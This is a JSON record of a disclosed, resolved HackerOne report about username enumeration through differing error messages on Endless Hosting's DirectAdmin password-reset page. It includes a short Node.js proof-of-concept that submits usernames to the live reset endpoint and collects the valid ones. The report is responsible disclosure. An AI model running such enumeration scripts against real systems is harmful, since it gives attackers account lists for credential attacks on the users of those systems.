{"id":806151,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDYxNTE=","url":"https://hackerone.com/reports/806151","title":"Enumeration of username on password reset page","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-02-27T12:01:26.930Z","submitted_at":"2020-02-27T12:01:26.930Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"codermak","url":"/codermak","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/c9Yeqnq2Apkoc1UAkLCciykW/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":37038,"url":"https://hackerone.com/endless_hosting","handle":"endless_hosting","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/zVTn9zZCSSQ7SD4HRUSyaj6d/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/zVTn9zZCSSQ7SD4HRUSyaj6d/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Endless Hosting","twitter_handle":"Endless_Hosting","website":"https://theendlessweb.com","about":"Endless Hosting provides free shared-hosting services."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-05T05:22:57.706Z","bug_reporter_agreed_on_going_public_at":"2020-06-05T05:22:48.575Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nReset password page api call, can be used to enumerate usernames based on the error message\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n    1. Go to password reset page\n    2. Enter username and click submit\n    3. Check email for password reset code, open the url in any browser\n    4. Change the username in url to somewrong username and click on `Request New Password` button you will get error message saying `No user`\n    5. Change the username in url to some username which exists other than which is used in step 2, click on `Request New Password` you will get error message saying `No such username in the request list. Your request may have expired.`\n    6. Based on this, if a username does not exists, error message `No User` is shown and if username exists `No such username in the request list. Your request may have expired.` error message is shown.\n    7. This can be automated with an username list and easily list of valid usernames can be generated\n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n#### PoC\n\n```\nconst fetch = require('node-fetch');\nlet usernames = [\n  'codermak',\n  'codermmak',\n  'codermak2',\n  'codermak222'\n];\nlet validUsernames = [];\n\nconst request = async (input) =\u003e {\n  const res = await fetch(\"https://da.theendlessweb.com:2222/CMD_LOST_PASSWORD\", {\n    \"credentials\": \"include\",\n    \"headers\": {\n      \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0\",\n      \"Accept\": \"*/*\",\n      \"Accept-Language\": \"en-US,en;q=0.5\",\n      \"Content-Type\": \"application/x-www-form-urlencoded\"\n    },\n    \"referrer\": \"https://da.theendlessweb.com:2222/lost-password?username=codermak2\u0026code=test\",\n    \"body\": `action=code\u0026username=${input}\u0026code=test\u0026json=yes`,\n    \"method\": \"POST\",\n    \"mode\": \"cors\"\n  });\n\n  const text = await res.text();\n  try {\n    const result = JSON.parse(text);\n    const errMessage = result.error;\n    if (errMessage === 'No such username in the request list.  Your request may have expired.') {\n      validUsernames.push(input);\n    }\n  } catch (err) {\n\n  }\n};\n\n\nconst main = async () =\u003e {\n  for (const username of usernames) {\n    await request(username);\n  }\n\n  console.log(validUsernames);\n}\n\nmain();\n```\n\n## Impact\n\nAttacker can easily find list of large amount of valid usernames by using some common usernames dictionaries avaialble on internet.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eReset password page api call, can be used to enumerate usernames based on the error message\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e[add details for how we can reproduce the issue]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1. Go to password reset page\n2. Enter username and click submit\n3. Check email for password reset code, open the url in any browser\n4. Change the username in url to somewrong username and click on `Request New Password` button you will get error message saying `No user`\n5. Change the username in url to some username which exists other than which is used in step 2, click on `Request New Password` you will get error message saying `No such username in the request list. Your request may have expired.`\n6. Based on this, if a username does not exists, error message `No User` is shown and if username exists `No such username in the request list. Your request may have expired.` error message is shown.\n7. This can be automated with an username list and easily list of valid usernames can be generated\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e[list any additional material (e.g. screenshots, logs, etc.)]\u003c/p\u003e\n\n\u003ch4 id=\"poc\"\u003ePoC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst fetch = require(\u0026#39;node-fetch\u0026#39;);\nlet usernames = [\n  \u0026#39;codermak\u0026#39;,\n  \u0026#39;codermmak\u0026#39;,\n  \u0026#39;codermak2\u0026#39;,\n  \u0026#39;codermak222\u0026#39;\n];\nlet validUsernames = [];\n\nconst request = async (input) =\u0026gt; {\n  const res = await fetch(\u0026quot;https://da.theendlessweb.com:2222/CMD_LOST_PASSWORD\u0026quot;, {\n    \u0026quot;credentials\u0026quot;: \u0026quot;include\u0026quot;,\n    \u0026quot;headers\u0026quot;: {\n      \u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0\u0026quot;,\n      \u0026quot;Accept\u0026quot;: \u0026quot;*/*\u0026quot;,\n      \u0026quot;Accept-Language\u0026quot;: \u0026quot;en-US,en;q=0.5\u0026quot;,\n      \u0026quot;Content-Type\u0026quot;: \u0026quot;application/x-www-form-urlencoded\u0026quot;\n    },\n    \u0026quot;referrer\u0026quot;: \u0026quot;https://da.theendlessweb.com:2222/lost-password?username=codermak2\u0026amp;code=test\u0026quot;,\n    \u0026quot;body\u0026quot;: `action=code\u0026amp;username=${input}\u0026amp;code=test\u0026amp;json=yes`,\n    \u0026quot;method\u0026quot;: \u0026quot;POST\u0026quot;,\n    \u0026quot;mode\u0026quot;: \u0026quot;cors\u0026quot;\n  });\n\n  const text = await res.text();\n  try {\n    const result = JSON.parse(text);\n    const errMessage = result.error;\n    if (errMessage === \u0026#39;No such username in the request list.  Your request may have expired.\u0026#39;) {\n      validUsernames.push(input);\n    }\n  } catch (err) {\n\n  }\n};\n\n\nconst main = async () =\u0026gt; {\n  for (const username of usernames) {\n    await request(username);\n  }\n\n  console.log(validUsernames);\n}\n\nmain();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker can easily find list of large amount of valid usernames by using some common usernames dictionaries avaialble on internet.\u003c/p\u003e\n","weakness":{"id":82,"name":"Information Exposure Through an Error Message"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-07-05T05:22:48.615Z","allow_singular_disclosure_after":-15298401.553668676,"singular_disclosure_allowed":true,"vote_count":4,"voters":["prophet","arwildo","b1e5353496ef5eb4b5a3d09","donpakundo666"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":18613,"asset_type":"URL","asset_identifier":"(*).theendlessweb.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7208366,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-03T17:37:10.072Z","updated_at":"2020-03-03T17:37:10.072Z","actor":{"username":"djelectro","cleared":false,"url":"/djelectro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/265/021/6ea3e4f5c95898231f1798d10d2270e08abf96f9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8203325,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nThank you for continuing to wait on the resolution of this issue. We are now waiting on the DirectAdmin team to create a fix for this issue should they deem it valid.\n\nThanks","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThank you for continuing to wait on the resolution of this issue. We are now waiting on the DirectAdmin team to create a fix for this issue should they deem it valid.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-04T16:45:51.362Z","updated_at":"2020-06-04T16:45:51.362Z","actor":{"username":"djelectro","cleared":false,"url":"/djelectro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/265/021/6ea3e4f5c95898231f1798d10d2270e08abf96f9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8204340,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello,\n\nThe DirectAdmin team has gotten back to us with a fix. https://www.directadmin.com/features.php?id=2805\nCurrently it is only available in the pre-release branch, which we do not install on our production servers as they may contain bugs and have not yet been tested. However, we will be sure to install the update once it is released to the stable branch.\n\nThanks for your efforts.","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe DirectAdmin team has gotten back to us with a fix. \u003ca title=\"https://www.directadmin.com/features.php?id=2805\" href=\"/redirect?url=https%3A%2F%2Fwww.directadmin.com%2Ffeatures.php%3Fid%3D2805\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.directadmin.com/features.php?id=2805\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCurrently it is only available in the pre-release branch, which we do not install on our production servers as they may contain bugs and have not yet been tested. However, we will be sure to install the update once it is released to the stable branch.\u003c/p\u003e\n\n\u003cp\u003eThanks for your efforts.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-04T19:01:32.437Z","updated_at":"2020-06-04T19:01:32.437Z","actor":{"username":"djelectro","cleared":false,"url":"/djelectro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/265/021/6ea3e4f5c95898231f1798d10d2270e08abf96f9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"codermak","url":"/codermak"},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8207401,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure. Thanks. Please let me know once its installed. I will be happy to verify the fix.","markdown_message":"\u003cp\u003eSure. Thanks. Please let me know once its installed. I will be happy to verify the fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-05T05:22:27.984Z","updated_at":"2020-06-05T05:22:27.984Z","actor":{"username":"codermak","cleared":false,"url":"/codermak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/c9Yeqnq2Apkoc1UAkLCciykW/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8207402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-05T05:22:48.595Z","updated_at":"2020-06-05T05:22:48.595Z","first_to_agree":true,"actor":{"username":"codermak","cleared":false,"url":"/codermak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/c9Yeqnq2Apkoc1UAkLCciykW/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8501551,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-05T05:22:57.768Z","updated_at":"2020-07-05T05:22:57.768Z","actor":{"url":"/endless_hosting","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/zVTn9zZCSSQ7SD4HRUSyaj6d/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Endless Hosting"}},"genius_execution_id":null,"team_handle":"endless_hosting","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}